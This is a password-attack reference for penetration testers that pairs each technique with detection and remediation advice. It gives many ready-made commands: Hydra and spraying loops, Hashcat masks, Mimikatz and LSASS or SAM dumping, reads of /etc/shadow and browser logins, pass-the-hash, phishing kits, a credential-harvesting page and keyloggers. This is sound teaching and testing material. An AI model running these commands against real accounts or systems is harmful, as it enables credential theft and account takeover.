# Password Attacks Reference

## Overview
Password attacks attempt to gain unauthorized access by compromising authentication credentials through various methods including brute force, dictionary attacks, hash cracking, and credential theft.

**MITRE ATT&CK**: T1110 (Brute Force), T1555 (Credentials from Password Stores), T1003 (OS Credential Dumping)

---

## Brute Force Attacks

### Description
Systematically attempting all possible password combinations until the correct one is found.

### Attack Types
- **Online Brute Force**: Direct authentication attempts
- **Offline Brute Force**: Attacking captured hashes
- **Hybrid Attacks**: Combining dictionary words with modifications

### Tools
- Hydra (online attacks)
- Medusa (parallel brute forcing)
- Ncrack (network authentication)
- Patator (modular brute forcer)
- Burp Suite Intruder

### Testing Methodology
1. Identify authentication mechanisms
2. Determine account lockout policies
3. Create targeted username list
4. Select appropriate wordlist
5. Configure rate limiting/delays
6. Execute attack with monitoring
7. Document successful credentials

### Example Commands
```bash
# Hydra SSH
hydra -L users.txt -P passwords.txt ssh://target.com

# Hydra HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Hydra FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# Medusa
medusa -h target.com -U users.txt -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 -U users.txt -P passwords.txt target.com

# Patator (versatile)
patator ssh_login host=target.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

### Rate Limiting Considerations
```bash
# Add delays to avoid detection/lockout
hydra -L users.txt -P passwords.txt -t 4 -w 30 ssh://target.com
# -t 4: 4 parallel connections
# -w 30: 30 second wait between attempts
```

### Detection Methods
- Failed login attempt monitoring
- Account lockout mechanisms
- Rate limiting
- CAPTCHA implementation
- IP-based blocking
- Behavioral analysis

### Remediation
- Implement account lockout policies
- Use multi-factor authentication (MFA)
- Enforce strong password policies
- Implement rate limiting
- Use CAPTCHA for web forms
- Monitor for brute force patterns
- Implement IP-based restrictions

### References
- **MITRE ATT&CK**: T1110.001 (Password Guessing)
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP**: Authentication Failure (A07:2021)
- **CAPEC**: CAPEC-49 (Password Brute Forcing)

---

## Dictionary Attacks

### Description
Using pre-compiled lists of common passwords and variants to authenticate.

### Common Wordlists
- **rockyou.txt**: 14+ million passwords from breach
- **SecLists**: Comprehensive password lists
- **CrackStation**: Massive wordlist compilation
- **Custom lists**: Target-specific wordlists

### Tools
- Same as brute force (Hydra, Medusa, etc.)
- CeWL (custom wordlist generator)
- Crunch (pattern-based wordlist generator)
- CUPP (user-profiling wordlist generator)

### Testing Methodology
1. Gather intelligence about target (OSINT)
2. Generate custom wordlists
3. Combine common passwords with variations
4. Apply password mutation rules
5. Execute dictionary attack
6. Try leaked credential databases

### Wordlist Generation
```bash
# CeWL - Spider website for words
cewl -d 2 -m 5 -w wordlist.txt https://target.com

# Crunch - Generate patterns
crunch 8 8 -t pass%%%% -o wordlist.txt
# Generates: pass0000, pass0001, ..., pass9999

# CUPP - Interactive profile-based
python3 cupp.py -i

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common mutations
john --wordlist=words.txt --rules --stdout > mutated.txt
```

### Common Password Patterns
```
Company name + year: Company2024
Name + birthdate: John1990
Seasonal: Summer2024!
Keyboard patterns: Qwerty123
Common substitutions: P@ssw0rd
```

### Detection Methods
- Monitor failed login attempts
- Detect common password patterns
- Implement password complexity requirements
- Use breach password databases
- Behavioral authentication analysis

### Remediation
- Block common/breached passwords
- Enforce password complexity
- Implement MFA
- Use password managers
- Regular security awareness training
- Monitor for credential stuffing

### References
- **MITRE ATT&CK**: T1110.002 (Password Cracking)
- **CWE**: CWE-521 (Weak Password Requirements)
- **Resources**:
  - SecLists: https://github.com/danielmiessler/SecLists
  - Have I Been Pwned: https://haveibeenpwned.com/

---

## Hash Cracking

### Description
Recovering plaintext passwords from captured password hashes using various cracking techniques.

### Hash Types
- **MD5**: Fast, widely used (insecure)
- **SHA-1/SHA-256**: Cryptographic hashes
- **NTLM**: Windows password hashes
- **bcrypt/scrypt**: Adaptive hashing (slower)
- **NetNTLMv2**: Network authentication
- **Kerberos**: Kerberoast hashes

### Tools
- Hashcat (GPU-accelerated)
- John the Ripper (CPU-based)
- hash-identifier (identify hash types)
- hashid (Python hash identifier)

### Testing Methodology
1. Capture/extract password hashes
2. Identify hash type
3. Select cracking mode (dictionary, brute force, mask, hybrid)
4. Configure attack parameters
5. Execute cracking
6. Analyze results

### Hashcat Examples
```bash
# Identify hash type
hashcat --example | grep -i ntlm
hashid hash.txt

# Dictionary attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Dictionary + rules
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# ?a = all characters

# Mask attack (known pattern)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d?d?d
# ?u=uppercase, ?l=lowercase, ?d=digit
# Pattern: Abcd1234

# Combinator attack
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Hybrid attack (wordlist + mask)
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d

# Resume session
hashcat --session mysession --restore

# Show cracked passwords
hashcat -m 1000 hashes.txt --show
```

### John the Ripper Examples
```bash
# Auto-detect format and crack
john hashes.txt

# Specify format
john --format=NT hashes.txt

# Dictionary attack
john --wordlist=rockyou.txt hashes.txt

# With rules
john --wordlist=words.txt --rules hashes.txt

# Incremental (brute force)
john --incremental hashes.txt

# Show cracked
john --show hashes.txt

# Resume interrupted session
john --restore
```

### Common Hash Formats (Hashcat -m values)
```
0     = MD5
100   = SHA1
1000  = NTLM
1400  = SHA-256
1700  = SHA-512
1800  = sha512crypt (Linux)
3000  = LM
5600  = NetNTLMv2
13100 = Kerberos 5 TGS-REP (Kerberoasting)
18200 = Kerberos 5 AS-REP (AS-REP Roasting)
```

### Cracking Strategies
1. **Quick wins**: Common passwords first
2. **Smart wordlists**: Targeted, context-aware
3. **Rules**: Apply mutations to wordlists
4. **Masks**: Known password patterns
5. **Hybrid**: Combine techniques
6. **GPU acceleration**: Significant speed boost

### Detection Methods
- Monitor for credential dumping
- Detect hash extraction tools
- Implement strong hashing algorithms
- Use salting and key stretching

### Remediation
- Use adaptive hashing (bcrypt, Argon2)
- Implement proper salting
- Increase work factors
- Enforce strong password policies
- Monitor for credential dumps
- Use MFA

### References
- **MITRE ATT&CK**: T1110.002 (Password Cracking)
- **CWE**: CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- **Hashcat**: https://hashcat.net/hashcat/
- **John**: https://www.openwall.com/john/

---

## Credential Dumping

### Description
Extracting credentials from memory, files, or system storage.

### Windows Credential Dumping

**Tools**:
- Mimikatz (memory credential extraction)
- LaZagne (browser/application passwords)
- ProcDump + Mimikatz (LSASS dumping)
- Secretsdump.py (Impacket)

**Techniques**:
```powershell
# Mimikatz - Extract from memory
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets

# Dump LSASS without Mimikatz
procdump.exe -ma lsass.exe lsass.dmp
# Then offline: mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

# Task Manager method
# Right-click lsass.exe -> Create dump file

# Registry dumps (SAM, SYSTEM, SECURITY)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Extract with secretsdump
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

# LaZagne
.\laZagne.exe all

# Extract Chrome passwords
.\SharpChrome.exe
```

### Linux Credential Dumping

**Techniques**:
```bash
# Password hashes
cat /etc/shadow

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Browser credentials
~/.mozilla/firefox/*.default/logins.json
~/.config/google-chrome/Default/Login Data

# Bash history (may contain passwords)
cat ~/.bash_history
cat ~/.zsh_history

# Configuration files
grep -r "password" /home 2>/dev/null
grep -r "pass" /etc/*.conf 2>/dev/null

# Process memory dumping
gcore <pid>
strings core.<pid> | grep -i pass
```

### Network Credential Capture

**Tools**:
- Responder (LLMNR/NBT-NS poisoning)
- Inveigh (PowerShell Responder)
- Ettercap (MitM)

**Techniques**:
```bash
# Responder
responder -I eth0 -wrf

# Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y

# Capture traffic
tcpdump -i eth0 -w capture.pcap port 21 or port 23
# Analyze with Wireshark for credentials
```

### Detection Methods
- Monitor LSASS access
- Detect Mimikatz signatures
- Alert on SAM/SYSTEM registry access
- Monitor credential access APIs
- Implement Credential Guard
- Use EDR solutions

### Remediation
- Implement Credential Guard
- Use Protected Process Light (PPL) for LSASS
- Limit local admin accounts
- Use LAPS (Local Administrator Password Solution)
- Implement just-in-time admin access
- Clear credentials from memory
- Monitor suspicious process access

### References
- **MITRE ATT&CK**: T1003 (OS Credential Dumping)
- **CWE**: CWE-522 (Insufficiently Protected Credentials)
- **Tools**: https://github.com/gentilkiwi/mimikatz
- **CAPEC**: CAPEC-191 (Read Sensitive Constants Within Memory)

---

## Pass-the-Hash (PtH)

### Description
Using NTLM hashes directly for authentication without cracking them.

### Tools
- Impacket suite (psexec.py, wmiexec.py, smbexec.py)
- CrackMapExec
- Metasploit
- Mimikatz

### Testing Methodology
1. Obtain NTLM hashes (via Mimikatz, secretsdump)
2. Identify target systems
3. Attempt authentication with hash
4. Execute commands if successful

### Example Commands
```bash
# Impacket psexec
psexec.py -hashes :ntlmhash administrator@target.com

# Impacket wmiexec
wmiexec.py -hashes :ntlmhash administrator@target.com

# Impacket smbexec
smbexec.py -hashes :ntlmhash administrator@target.com

# CrackMapExec
crackmapexec smb target.com -u administrator -H ntlmhash
crackmapexec smb target.com -u administrator -H ntlmhash -x "whoami"

# Metasploit
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass ntlmhash
set RHOSTS target
exploit
```

### Mimikatz Pass-the-Hash
```powershell
# Pass-the-hash
sekurlsa::pth /user:administrator /domain:domain.com /ntlm:hash /run:cmd.exe

# Then use commands in spawned shell
dir \\target\c$
psexec \\target cmd
```

### Detection Methods
- Monitor for lateral movement
- Detect NTLM authentication patterns
- Enable Windows logging (4624, 4625, 4648)
- Use Security Information and Event Management (SIEM)
- Behavioral analysis

### Remediation
- Disable NTLM authentication where possible
- Use Kerberos authentication
- Implement Protected Users group
- Use Credential Guard
- Implement tiered administration
- Restrict local admin accounts
- Monitor lateral movement

### References
- **MITRE ATT&CK**: T1550.002 (Pass the Hash)
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **Microsoft**: https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/

---

## Password Spraying

### Description
Attempting a small number of common passwords against many user accounts to avoid account lockouts.

### Strategy
- Use 1-3 common passwords
- Target all users
- Wait between attempts (respect lockout policy)
- Common passwords: Password1, Company2024, Season+Year

### Tools
- CrackMapExec
- Spray (DomainPasswordSpray.ps1)
- Hydra
- Custom scripts

### Testing Methodology
1. Enumerate valid usernames
2. Identify account lockout policy
3. Select 1-3 common passwords
4. Calculate safe delay between attempts
5. Execute spray attack
6. Document successful authentications

### Example Commands
```bash
# CrackMapExec password spray
crackmapexec smb target.com -u users.txt -p 'Password123' --continue-on-success

# DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Summer2024!

# Custom spray with delay
for user in $(cat users.txt); do
  hydra -l $user -p 'Password123!' target.com http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
  sleep 1800  # 30 minute delay
done

# Office 365 spray
.\MSOLSpray.ps1 -UserList users.txt -Password 'Summer2024!'
```

### Account Lockout Considerations
```
Example policy: 5 failed attempts, 30-minute lockout
Safe approach: 1-2 attempts per 30-60 minutes
Timing: Spread over hours/days to avoid detection
```

### Detection Methods
- Monitor failed login patterns
- Detect multiple users with same password attempt
- Anomaly detection in authentication logs
- Time-based pattern recognition
- Failed login velocity monitoring

### Remediation
- Implement MFA
- Use adaptive authentication
- Monitor for spray patterns
- Block common passwords
- Implement conditional access
- User education on password security

### References
- **MITRE ATT&CK**: T1110.003 (Password Spraying)
- **CWE**: CWE-307
- **CAPEC**: CAPEC-565 (Password Spraying)

---

## Credential Stuffing

### Description
Using credentials obtained from breaches to attempt authentication on other services.

### Attack Process
1. Obtain breach credential lists
2. Target specific service/platform
3. Attempt authentication with leaked credentials
4. Identify successful logins
5. Account takeover

### Tools
- Sentry MBA
- SNIPR
- OpenBullet
- Custom automation scripts

### Data Sources
- Public breach databases
- Dark web marketplaces
- Pastebin dumps
- Previous compromises

### Testing Methodology
1. Identify credential breach databases
2. Extract relevant credentials
3. Format for target service
4. Configure tool/script
5. Implement rate limiting
6. Execute attack
7. Document successful accounts

### Detection Methods
- Anomalous login locations
- Multiple failed login attempts
- Credential breach monitoring
- Behavioral analytics
- Device fingerprinting
- Velocity checks

### Remediation
- Implement MFA
- Monitor breach databases
- Force password resets for breached credentials
- Use bot detection
- Implement CAPTCHA
- Rate limiting
- Geographic restrictions
- Device fingerprinting

### References
- **MITRE ATT&CK**: T1110.004 (Credential Stuffing)
- **CWE**: CWE-262 (Not Using Password Aging)
- **OWASP**: Credential Stuffing Prevention Cheat Sheet
- **Resources**: Have I Been Pwned API

---

## Phishing for Credentials

### Description
Social engineering attacks to trick users into providing credentials.

### Phishing Types
- **Email Phishing**: Malicious emails
- **Spear Phishing**: Targeted attacks
- **Whaling**: Targeting executives
- **Smishing**: SMS phishing
- **Vishing**: Voice phishing

### Tools
- Gophish (phishing framework)
- Social Engineering Toolkit (SET)
- King Phisher
- CredSniper
- Evilginx2 (reverse proxy phishing)

### Testing Methodology
1. Identify targets
3. Create convincing pretext
4. Clone legitimate login pages
5. Send phishing emails
6. Capture credentials
7. Analyze success rate
8. Provide security awareness training

### Example Setup
```bash
# Gophish
./gophish

# SET (Social Engineering Toolkit)
setoolkit
# Select: Website Attack Vectors
# Select: Credential Harvester Attack Method
# Select: Site Cloner

# Evilginx2 (reverse proxy)
./evilginx2 -p phishlets/
lures create office365
lures get-url 0
```

### Credential Harvesting Page
```html
<!-- Basic phishing page structure -->
<!DOCTYPE html>
<html>
<head><title>Login - Company Portal</title></head>
<body>
<form action="capture.php" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
</body>
</html>
```

### Detection Methods
- Email filtering and analysis
- Link analysis
- Domain reputation
- User reporting
- Security awareness training effectiveness
- Monitor for cloned websites

### Remediation
- Security awareness training
- Email authentication (SPF, DKIM, DMARC)
- Anti-phishing tools
- MFA implementation
- URL filtering
- Simulated phishing exercises
- Reporting mechanisms

### References
- **MITRE ATT&CK**: T1566 (Phishing)
- **CWE**: CWE-1390 (Weak Authentication)
- **OWASP**: Phishing
- **Resources**: https://www.getgophish.com/

---

## Keylogging

### Description
Capturing keystrokes to obtain passwords and sensitive information.

### Types
- **Software keyloggers**: Installed programs
- **Hardware keyloggers**: Physical devices
- **Kernel-level keyloggers**: OS-level capture
- **Web-based keyloggers**: JavaScript capture

### Tools
- Metasploit keylogger (Meterpreter)
- PowerSploit (Get-Keystrokes)
- Custom scripts
- Commercial keyloggers (for testing)

### Testing Methodology
1. Deploy keylogger (software or hardware)
3. Configure logging/transmission
4. Monitor captured data
5. Analyze for credentials
6. Securely delete captured data

### Meterpreter Keylogger
```bash
# In meterpreter session
keyscan_start
# Wait for activity
keyscan_dump
keyscan_stop
```

### PowerShell Keylogger
```powershell
# Get-Keystrokes.ps1
Import-Module .\Get-Keystrokes.ps1
Get-Keystrokes -LogPath C:\temp\keys.log
```

### Detection Methods
- Anti-keylogger software
- Behavioral analysis
- Process monitoring
- USB device control
- Virtual keyboard for sensitive input
- EDR solutions

### Remediation
- Endpoint protection software
- Application whitelisting
- USB device control
- Virtual keyboards for sensitive operations
- Regular security scans
- User awareness training
- Implement EDR

### References
- **MITRE ATT&CK**: T1056.001 (Keylogging)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **CAPEC**: CAPEC-568 (Capture Credentials via Keylogger)
